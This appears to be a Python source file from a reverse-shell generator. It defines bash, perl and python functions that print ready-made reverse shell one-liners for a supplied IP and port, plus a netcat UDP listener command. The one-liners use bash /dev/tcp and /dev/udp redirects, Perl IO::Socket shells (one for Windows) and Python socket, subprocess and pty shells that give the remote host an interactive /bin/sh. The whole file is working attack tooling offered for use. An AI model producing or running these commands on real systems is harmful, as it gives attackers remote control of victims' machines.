def bash(IP: str, port: str):
    print("")
    print(f" bash -i >& /dev/tcp/{IP}/{port} 0>&1\n")
    print(f" 0<&196;exec 196<>/dev/tcp/{IP}/{port}; sh <&196 >&196 2>&196\n")
    print(f" /bin/bash -l > /dev/tcp/{IP}/{port} 0<&1 2>&1\n")
    print(" You can use this for UPD\n")
    print(" Victim host")
    print(f" sh -i >& /dev/udp/{IP}/{port} 0>&1\n")
    print(" On your local machine")
    print(f" nc -u -lvp {port}")
    print("")

def perl(IP: str, port: str):
    print("")
    print(" perl -e 'use Socket;$i=\"%s\";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'\n" % (IP, port))
    print(" perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"%s:%s\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'\n" % (IP, port))
    print(" The below line is for windows only\n")
    print(" perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\"%s:%s\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'" % (IP, port))
    print("")

def python(IP: str, port: str):
    print("")
    print("These are for Linux only\n")
    print("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n" % (IP, port))
    print("export RHOST=\"%s\";export RPORT=%s;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'\n" % (IP, port))
    print("python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'\n" % (IP, port))
    print("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'\n" % (IP, port))
    print("python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'\n" % (IP, port))
    print("python -c 'socket=__import__(\"socket\");os=__import__(\"os\");pty=__import__(\"pty\");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'\n" % (IP, port))
